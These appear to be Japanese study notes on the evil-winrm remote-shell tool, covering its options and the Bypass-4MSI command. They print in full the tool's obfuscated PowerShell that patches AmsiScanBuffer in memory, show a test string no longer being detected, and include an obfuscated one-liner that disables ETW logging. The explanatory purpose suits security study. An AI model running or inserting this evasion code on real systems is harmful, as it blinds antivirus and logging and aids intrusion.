## -h
```
Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-a USERAGENT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -a, --user-agent USERAGENT       Specify connection user-agent (default Microsoft WinRM Client)
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message
```


## -S
HTTPS用のポートは5986番ポートを使用する（デフォルトのHTTPは5985番）  
WinRMでHTTPSの設定がされていないと、このオプションは使用できない。  
https://learn.microsoft.com/ja-jp/troubleshoot/windows-client/system-management-components/configure-winrm-for-https
```ruby
opts.on('-S', '--ssl', 'Enable ssl') do |_val|
    $ssl = true
    options[:port] = '5986'
```

## -U
デフォルトは「POST /wsman」HTTPを使用してWinRMを行う。デフォルト設定のままだと、wsman以外のURLではWinRMを使用できない


## [-N](https://github.com/Hackplayers/evil-winrm/blob/ffe958c841da655ba3c44740ca22aa0eee9fc5ed/evil-winrm.rb#L177)
リモート上でのタブ補完を無効にする  
※現時点で、KaliのRubyの「Readline.quoting_detection_proc」は実装されていなのでタブ補完は機能していない

## -l
自動でログファイルが作成され、$loggerを使用してログ出力している  
実行コマンド、コマンド結果もログ出力されている
```ruby
$filepath = "#{$full_logging_path}/#{Time.now.strftime('%Y%d%m')}/#{$host}/#{Time.now.strftime('%H%M%S')}"
$logger = Logger.new($filepath)
```


# command
## [menu](https://github.com/Hackplayers/evil-winrm/blob/ffe958c841da655ba3c44740ca22aa0eee9fc5ed/evil-winrm.rb#L836)
使用可能なevil-winrm独自のコマンドを確認できる
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> menu


   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit
```


## [Bypass-4MSI](https://github.com/Hackplayers/evil-winrm/blob/ffe958c841da655ba3c44740ca22aa0eee9fc5ed/evil-winrm.rb#L873)
「Bypass-4MSI」を実行すると、使用できるコマンドが増える
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> Bypass-4MSI
                                        
Warning: AV could be still watching for suspicious activity. Waiting for patching...
                                        
Info: Patching 4MSI, please be patient...
                                        
[+] Success!
                                        
Info: Patching ETW, please be patient ..
                                        
[+] Success!
*Evil-WinRM* PS C:\Users\Administrator\Documents> menu
                                        
Info: Bypass-4MSI is loaded. Trying to load utilities


   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Dll-Loader
[+] Donut-Loader
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit
```
AMSIをバイバスるるためにPowershellが実行される  
このPowershellは、evil-winrmのコード上では難読化されている  
ちなみにこのPowershellを一気に実行するとDefenderでは検知されるので、各「#jamp」コードごとに２秒待機するようになっている
```powershell
FUncTIon Get-PZ2zmpurexnDXVSxx {
    Param ($ljOHgifgLteNDYGV, $HWN81YY7isiEXwOd)

# [AppDomain]::CurrentDomain.GetAssemblies()でロードされているアセンブリを取得し、System.dllがロードされているかどうか「Equals」メソッドで確認
# ロードされているSystem.dllが「Microsoft.Win32.UnsafeNativeMethods」がどうか「GetType」メソッドで確認
    $IObr8mVbBcalgmD = ([AppDomain]::CurrentDomain.GetAssemblies() |
    WheRe-ObJecT { 
        $_.GlobalAssemblyCache -And $_.Location.Split(""+[cHaR](6474-6382)+"")[-1].Equals(""+[cHAR](8862-8779)+[CHaR](9611-9490)+[chaR](4982-4867)+[chaR]([bYtE] 0xb6-0x42)+[cHar](1707-1606)+[chaR](7297-7188)+[CHAR](1332-1286)+[cHaR]([Byte] 0xba-0x56)+[Char](7772-7664)+[char](6965-6857)+"")
     }).GetType("Microsoft."+[cHar]([BYTE] 0xae-0x57)+[cHaR](5622-5517)+[ChaR](8858-8748)+[chaR]([byTe] 0x56-0x23)+[chAR](1248-1198)+[ChaR](877-831)+[CHAR](4158-4073)+[ChaR](4512-4402)+"safeNativeMethods")

# 「GetMethods()」メソッドでsystem.dllの「GetProcAddress」を取得
    $IqnMnVucT=@()
    $IObr8mVbBcalgmD.GetMethods() | FOrEaCH-ObJEct {
        If($_.Name -LiKe "Ge*P*oc*"+[char](8884-8784)+[cHaR](6481-6381)+[cHAr](4918-4804)+[chAr]([bYTe] 0xc7-0x62)+[cHAR](859-744)+"s") {
            $IqnMnVucT+=$_
        }
    }

#「GetMethods()」メソッドで System.dllの「GetModuleHandle」を取得し、「GetModuleHandle.Invoke($null,引数DLL名)」を実行し引数DLLのハンドルを取得
# System.dllの「GetProcAddress」で、引数DLLの引数プロセス名のアドレスを取得
    return $IqnMnVucT[0].Invoke($null, @(($IObr8mVbBcalgmD.GetMethod(""+[char]([BYtE] 0x96-0x4f)+[ChaR]([BytE] 0xbb-0x56)+[cHar](5090-4974)+[CHar](7341-7264)+"odul"+[cHaR]([byte] 0xa8-0x43)+[ChAr](1345-1273)+[cHAR](1128-1031)+[cHAr](8032-7922)+"dle")).Invoke($null, @($ljOHgifgLteNDYGV)), $HWN81YY7isiEXwOd))

}
#jump

FUncTIon Get-iy2kysa7yS {
    Param (
     [Parameter(Position = 0, Mandatory = $True)] [Type[]] $jqr21eiEq5PCPuo, [Parameter(Position = 1)] [Type] $zjYqpHs8RLAoDPo = [Void]
    )

# [AppDomain]::CurrentDomain.DefineDynamicAssemblyで「動的アセンブリの一意のID」と「アクセスモード」を指定して、動的アセンブリを定義
# 動的アセンブリの一意のIDは、[System.Reflection.AssemblyName]で「ReflectedDelegate」という名前を指定
# アクセスモードは、[System.Reflection.Emit.AssemblyBuilderAccess]::Runを指定（Runは動的アセンブリは実行されるが保存されない）
# [AppDomain]::CurrentDomain.DefineDynamicAssemblyの戻り値は「System.Reflection.Emit.AssemblyBuilder」クラス
# AssemblyBuilderクラスの「DefineDynamicModule」メソッドで、「動的モジュールの名前」と「シンボル情報出力の有無」を指定
# 動的モジュールの名前は「InMemoryModule」を、シンボル情報出力の有無は「false」を指定
# AssemblyBuilder.DefineDynamicModule()メソッドの戻り値は、「System.Reflection.Emit.ModuleBuilder」クラス
# ModuleBuilderクラスの「DefineType」メソッドで「MyDelegateType」という名前を指定
    $WQvsFMfB0c = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object SYSTEM.REFLECtiOn.AsSembLYNaME(""+[cHaR](3975-3893)+[chaR](6333-6232)+[cHAR](6160-6058)+"lec"+[chAR](9375-9259)+[Char](6379-6278)+[cHaR](340-240)+[CHAR](6723-6655)+[cHAr](5669-5568)+"legate")),
        [SYsTEM.ReflEctIoN.EMit.ASSemBlYBuiLDERACCeSs]::Run
    ).DEfINEDYnAMiCMODUle(
        ""+[Char](5533-5460)+[cHAR]([byTE] 0xb1-0x43)+[chaR](5985-5908)+"emo"+[Char](467-353)+[cHAr]([BYTE] 0xd8-0x5f)+"Module",
        $false
    ).DefineType(
        $(""+[ChAr]([ByTe] 0x82-0x35)+[CHaR](7019-6898)+[cHar](8273-8205)+[Char](5350-5249)+[ChAr](4707-4599)+[cHAr]([BytE] 0xca-0x65)+[ChaR](9729-9626)+[CHar](686-589)+[chAr]([BYtE] 0x9c-0x28)+[chaR](936-835)+[cHAr]([bYte] 0x89-0x35)+[cHaR](3845-3724)+[Char]([ByTE] 0xd9-0x69)+[chAr](7417-7316)+""),
        "Class, Public, Sealed, AnsiClass, AutoClass",
        [SyStem.MUlTicaSTDeLEgate]
    )

    $WQvsFMfB0c.DefiNeCONstRUcToR(
        "RTSpecialName, HideBySig, Public",
        [SYSTem.REfLectiON.CAlLINgCoNVeNtIOnS]::Standard, $jqr21eiEq5PCPuo
    ).SetImplementationFlags("Runtime, Managed")

    $WQvsFMfB0c.DeFINeMeTHod(
        "Invoke",
        "Public, HideBySig, NewSlot, Virtual",
        $zjYqpHs8RLAoDPo,
        $jqr21eiEq5PCPuo
    ).SetImplementationFlags("Runtime, Managed")

# System.Reflection.Emit.ModuleBuilder.DefineType()メソッドの戻り値は「System.Reflection.Emit.TypeBuilder」クラス
# TypeBuilderクラスのCreateType()メソッドで、オブジェクトを作成
    return $WQvsFMfB0c.CreateTYpe()
}

#jump
# 「Get-PZ2zmpurexnDXVSxx $amsi.dll $AmsiScanBuffer」を実行し、「AmsiScanBuffer」プロセスのアドレスを取得
[IntPtr]$jdemwXeK2wnWhB = Get-PZ2zmpurexnDXVSxx $(""+[char](2099-2002)+[ChAr](5453-5344)+[CHar]([bytE] 0xb5-0x42)+[Char]([Byte] 0xdf-0x76)+[chAr]([BYTE] 0x4d-0x1f)+[chAR](2502-2402)+[chAR](749-641)+[cHar]([BytE] 0x91-0x25)+"") $(""+[ChAr](3160-3095)+[cHaR]([BYtE] 0xdc-0x6f)+[cHar](6716-6601)+[chAR]([ByTe] 0xdf-0x76)+[Char](7170-7087)+[ChAr]([BYtE] 0xd5-0x72)+[cHAR](6847-6750)+[chaR](2526-2416)+[cHAr](3598-3532)+[char](7822-7705)+[ChAr](377-275)+[cHar](3259-3157)+[chaR](7660-7559)+[cHar](4473-4359)+"")
#jump
$N7IBEcG01XRRln = 0
#jump
# 「Get-PZ2zmpurexnDXVSxx $kernel32.dll  VirtualProtect」でk「VirtualProtect」プロセスのアドレスを取得
# 「Get-iy2kysa7yS」で動的アセンブリを作成
# System.Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer()メソッドでアンマネージ関数ポインターをデリゲートに変換する。
$knBIRuLz=[SYsTem.RuNtiMe.INtErOpSeRvIcES.MArsHal]::GETDElEgaTEForFUNCtionPOiNTeR(
    (Get-PZ2zmpurexnDXVSxx $(""+[ChAR](577-470)+[ChaR](2547-2446)+[cHar](5679-5565)+[chAr](6260-6150)+[cHAr](4851-4750)+[ChAr](3338-3230)+[char](9887-9836)+[Char]([bYTe] 0x77-0x45)+[CHAR](4271-4225)+[cHar](7885-7785)+[cHAR]([bytE] 0xdc-0x70)+[ChAR](1500-1392)+"") VirtualProtect), 
    (Get-iy2kysa7yS @([IntPtr], [UInt32], [UInt32], [UInt32].MAkeBYREFTypE()) ([Bool]))
)
#jump
# VirtualProtectをInvokeで実行して、AmsiScanBufferのアクセス保護属性を「0x40(PAGE_EXECUTE_READWRITE)」に変更
$UQXThoSh2exMyo = $knBIRuLz.Invoke($jdemwXeK2wnWhB, 3, 0x40, [ref]$N7IBEcG01XRRln)
#jump
$hpBlHjUMs = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
#jump
# System.Runtime.InteropServices.Marshal.Copy()メソッドを使用して、マネージド配列のデータをアンマネージド メモリ ポインター(AmsiScanBuffer)にコピーする
# 要するに、AmsiScanBufferのプロセスが上書きされる
$UQXThoSh2exMyo = [SYsTem.RuNtiMe.INtErOpSeRvIcES.MArsHal]::Copy($hpBlHjUMs, 0, $jdemwXeK2wnWhB, 12)
#jump
Remove-Item Function:Get-iy2kysa7yS
#jump
```
実際にAMSIバイパスできたか確認  
 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'という文字列は、PowershellでのAMSI検知用のテスト文字列
```powershell
PS C:\Users\me> 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
発生場所 行:1 文字:1
+ AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
このスクリプトには、悪質なコンテンツが含まれているため、ウイルス対策ソフトウェアによりブロックされています。
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```
それでは先程のPowershellコードを実行すると、検知されていないことが分かった
```powershell
PS C:\Users\me> 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386
```

また、ETX(Event Tracing for Windows)を無効にする
```powershell
# [Reflection.Assembly]::LoadWithPartialName("System.Core").GetType("System.Diagnostics.Eventing.EventProvider"),GetField(m_enabled NonPUbliC,Instance).SetValue([ref].Assembly.GetType(System.Management.Automation.Tracing.PSEtwLogProvider)).GetField("etwProvider","NonPUbliC,StATIc").GetValue($irKIwf1Nj0k3B9gk),0)
[Reflection.Assembly]::LoadWithPartialName(""+[chAr](5198-5115)+[CHaR]([ByTE] 0xd3-0x5a)+[ChAr](7743-7628)+[chaR]([bytE] 0xa6-0x32)+[char]([bYtE] 0x9f-0x3a)+[Char]([Byte] 0xe2-0x75)+[cHaR]([BYTE] 0x58-0x2a)+[cHaR](9831-9764)+[chaR](1705-1594)+[cHaR](2263-2149)+[CHAR](7052-6951)+"").GetType("Sys"+[cHaR]([bYTe] 0xdc-0x68)+[cHaR]([BYtE] 0xb1-0x4c)+[CHaR]([bytE] 0xa1-0x34)+[CHAR](8369-8323)+[chaR](404-336)+[cHar](5001-4896)+[chAR](3166-3069)+[Char](10105-10002)+"nostics.E"+[chAr](7691-7573)+[ChaR]([ByTE] 0x9a-0x35)+[cHaR]([byte] 0xad-0x3f)+[cHAR](7950-7834)+[CHAR]([bytE] 0xa2-0x39)+[cHar]([BYtE] 0xc5-0x57)+[cHAr](8365-8262)+[cHaR](1106-1060)+[CHAR](7077-7008)+[CHaR]([bYTe] 0xad-0x37)+[cHaR](7612-7511)+[CHAR](4363-4253)+[cHAR](487-371)+"Provider").GeTFIeLd(""+[CHAR](6744-6635)+[cHaR]([bytE] 0x9d-0x3e)+"enabled","NonPUbliC,Instance").SetValue([ReF].AsSeMbLy.GeTTYPE("Sys"+[ChaR](7882-7766)+[char](5267-5166)+[cHAr](5870-5761)+[ChaR](9274-9228)+[ChaR](6318-6241)+[CHAr](2343-2246)+[ChAR](2760-2650)+[CHaR]([BYtE] 0xd7-0x76)+[CHaR](7134-7031)+[char](4510-4409)+[cHAr](8587-8478)+[cHAr]([BytE] 0x9a-0x35)+[ChAR](6032-5922)+[chAR](2113-1997)+[Char](2757-2711)+[chaR](6667-6602)+[char](6210-6093)+[ChaR](791-675)+[cHAR](4112-4001)+[ChAR](2098-1989)+[chAr](1037-940)+[Char](228-112)+[chAR](7716-7611)+[char](7361-7250)+[cHAr](5484-5374)+[cHar]([byTe] 0x8b-0x5d)+[cHaR](1698-1614)+[CHaR](2300-2186)+[ChAr]([BYte] 0xa7-0x46)+[chAr](3892-3793)+[ChAR](8825-8720)+[CHaR]([byTE] 0xbd-0x4f)+[CHar](5762-5659)+[ChaR](3792-3746)+[ChAr]([BYTE] 0xa2-0x52)+[cHaR](7586-7503)+[cHAr](9718-9649)+[cHar](1578-1462)+[Char]([byTe] 0xc5-0x4e)+"Log"+[CHaR](4442-4362)+[Char](9054-8940)+[ChAR](4903-4792)+[CHAr](6284-6166)+[ChaR](5478-5373)+[chaR]([bYTE] 0x88-0x24)+[cHAr](9209-9108)+[chAR](8237-8123)+"").GeTFIeLd(""+[CHAr]([byTE] 0xa9-0x44)+[cHAR](7593-7477)+[char](3637-3518)+[ChaR](5148-5068)+[cHaR]([bYte] 0xc5-0x53)+[CHAr]([BytE] 0xba-0x4b)+[cHar](7886-7768)+[CHar](5124-5019)+[CHAR](9944-9844)+[cHar](8908-8807)+[cHaR](2441-2327)+"","NonPUbliC,StATIc").GetVaLUe($irKIwf1Nj0k3B9gk),0)  
```
